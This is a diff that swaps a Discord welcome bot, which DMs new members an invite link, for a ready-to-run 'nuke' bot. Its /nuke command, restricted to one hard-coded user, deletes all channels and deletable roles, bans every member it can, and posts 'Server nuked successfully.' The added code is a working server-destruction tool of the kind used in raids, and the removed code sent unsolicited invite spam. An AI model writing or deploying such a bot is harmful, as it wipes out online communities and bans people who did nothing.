@@ -1,91 +1,161 @@
+# bot.py
 import os
-import discord
-from discord.ext import commands
-from flask import Flask
 import threading
-import random
+import asyncio
+import nextcord
+from nextcord.ext import commands
+from nextcord.ui import View, Button
+from nextcord import Interaction
+from flask import Flask
 
-# -------------------- Flask Server --------------------
-app = Flask(__name__)
+# ----------------------
+# CONFIG
+# ----------------------
+AUTHORIZED_USER = 1355140133661184221  # Only this user can use /nuke
+TOKEN = os.environ.get("TOKEN")
+PORT = int(os.environ.get("PORT", 10000))
 
-@app.route('/')
+if not TOKEN:
+    raise RuntimeError("Missing TOKEN environment variable")
+
+# ----------------------
+# FLASK KEEP-ALIVE (Render)
+# ----------------------
+app = Flask("")
+
+@app.route("/")
 def home():
-    return "Phoenix is alive..."
+    return "Bot is running!"
 
-threading.Thread(target=lambda: app.run(
-    host="0.0.0.0", port=int(os.environ.get("PORT", 8080))
-)).start()
+def run_flask():
+    app.run(host="0.0.0.0", port=PORT)
 
-# -------------------- Discord Bot ---------------------
-intents = discord.Intents.default()
-intents.members = True
+threading.Thread(target=run_flask, daemon=True).start()
+
+# ----------------------
+# NEXTCORD BOT
+# ----------------------
+intents = nextcord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-WELCOME_CHANNEL = 1441813949220782181
-GOODBYE_CHANNEL = 1442369914265534596
-
-WELCOME_GIF = "https://cdn.discordapp.com/attachments/1418573231698214982/1442699662426636329/image0.gif?ex=69266243&is=692510c3&hm=a1ed6041f67f553e464498183863848c6e572d9dfd000afa214776ad8f0fbf3e&"
-GOODBYE_GIF = "https://cdn.discordapp.com/attachments/1418573231698214982/1442699366778404926/image0.gif?ex=692661fd&is=6925107d&hm=0e03964485afd6bfdf6be27e123da8decd814b95520a888d4374a67d0bd4f617&"
-
-WELCOME_LINES = [
-    "✨ A new spark rises… the Phoenix acknowledges your arrival.",
-    "🔥 Destiny shifts as you enter our realm, warrior.",
-    "🌅 A radiant soul ascends into our skies — welcome.",
-    "🕊️ The Phoenix spreads its wings in your honor."
-]
-
-GOODBYE_LINES = [
-    "🌑 A flame dims… yet legends never truly fade.",
-    "🍂 The winds carry your name onward — until we meet again.",
-    "🔥 Even departing embers glow with purpose. Farewell.",
-    "💫 The Phoenix bows — your journey continues elsewhere."
-]
 
 @bot.event
 async def on_ready():
-    print("Phoenix has awakened.")
+    print(f"Bot logged in as {bot.user}")
 
-# -------------------- WELCOME --------------------
-@bot.event
-async def on_member_join(member):
-    channel = bot.get_channel(WELCOME_CHANNEL)
-    if channel:
-        line = random.choice(WELCOME_LINES)
-        embed = discord.Embed(
-            title="🔥 The Phoenix Welcomes You 🔥",
-            description=line,
-            color=discord.Color.red()
-        )
-        embed.set_image(url=WELCOME_GIF)
-        embed.set_footer(text="May your fire burn brighter within our realm.")
 
-        await channel.send(f"Hello {member.mention} ✨", embed=embed)
+# ----------------------
+# CONFIRMATION BUTTON VIEW
+# ----------------------
+class ConfirmNuke(View):
+    def __init__(self, user_id):
+        super().__init__(timeout=60)
+        self.user_id = user_id
+        self.result = None
 
-        # ==== UPDATED DM MESSAGE ====
+    async def interaction_check(self, interaction: Interaction):
+        if interaction.user.id != self.user_id:
+            await interaction.response.send_message("You cannot use these buttons.", ephemeral=True)
+            return False
+        return True
+
+    @nextcord.ui.button(label="CONFIRM NUKE", style=nextcord.ButtonStyle.danger)
+    async def confirm(self, button, interaction: Interaction):
+        self.result = True
+        for child in self.children:
+            child.disabled = True
+        await interaction.response.edit_message(content="💥 Nuke confirmed! Starting...", view=self)
+        self.stop()
+
+    @nextcord.ui.button(label="CANCEL", style=nextcord.ButtonStyle.secondary)
+    async def cancel(self, button, interaction: Interaction):
+        self.result = False
+        for child in self.children:
+            child.disabled = True
+        await interaction.response.edit_message(content="❌ Cancelled.", view=self)
+        self.stop()
+
+
+# ----------------------
+# /NUKE COMMAND
+# ----------------------
+@bot.slash_command(name="nuke", description="Deletes all channels, roles, and bans everyone.")
+async def nuke(interaction: Interaction):
+
+    # Check if authorized user
+    if interaction.user.id != AUTHORIZED_USER:
+        await interaction.response.send_message("❌ You cannot use this command.", ephemeral=True)
+        return
+
+    view = ConfirmNuke(interaction.user.id)
+
+    await interaction.response.send_message(
+        "⚠️ **WARNING** — This will delete all channels, deletable roles, and ban all possible members.\n"
+        "Press **CONFIRM NUKE** to continue.",
+        view=view,
+        ephemeral=True
+    )
+
+    await view.wait()
+
+    if not view.result:
+        await interaction.followup.send("Nuke cancelled.", ephemeral=True)
+        return
+
+    guild = interaction.guild
+    bot_member = guild.get_member(bot.user.id)
+
+    # ----------------------
+    # DELETE CHANNELS
+    # ----------------------
+    for channel in list(guild.channels):
         try:
-            await member.send(
-                "Thanking you for joining our server!\n"
-                "Join the 🌎SECRET HIDEOUT🌎 now\n"
-                "https://discord.gg/G7YMme2VdH"
-            )
+            await channel.delete(reason="Nuked")
+            await asyncio.sleep(0.2)
         except:
             pass
 
-# -------------------- GOODBYE --------------------
-@bot.event
-async def on_member_remove(member):
-    channel = bot.get_channel(GOODBYE_CHANNEL)
-    if channel:
-        line = random.choice(GOODBYE_LINES)
-        embed = discord.Embed(
-            title="🌑 The Phoenix Watches You Depart 🌑",
-            description=line,
-            color=discord.Color.dark_red()
-        )
-        embed.set_image(url=GOODBYE_GIF)
-        embed.set_footer(text="Your flame may travel, but it is never forgotten.")
+    # ----------------------
+    # DELETE ROLES
+    # ----------------------
+    for role in list(guild.roles):
+        try:
+            if role.is_default():
+                continue
+            if role.managed:
+                continue
+            if role.position >= bot_member.top_role.position:
+                continue
+            await role.delete(reason="Nuked")
+            await asyncio.sleep(0.15)
+        except:
+            pass
 
-        await channel.send(f"{member.name} has left the realm…", embed=embed)
+    # ----------------------
+    # BAN MEMBERS  (UPDATED)
+    # ----------------------
+    for member in list(guild.members):
+        try:
+            if member.id == AUTHORIZED_USER or member.id == bot.user.id:
+                continue
+            await guild.ban(member, reason="Nuked", delete_message_days=0)
+            await asyncio.sleep(0.25)
+        except:
+            pass
 
-# -------------------- Run Bot --------------------
-bot.run(os.environ.get("DISCORD_TOKEN"))
+    # ----------------------
+    # Create final channel
+    # ----------------------
+    try:
+        ch = await guild.create_text_channel("server-nuked")
+        await ch.send("💥 Server nuked successfully.")
+    except:
+        pass
+
+    await interaction.followup.send("🔥 Nuke completed.", ephemeral=True)
+
+
+# ----------------------
+# RUN BOT
+# ----------------------
+bot.run(TOKEN)
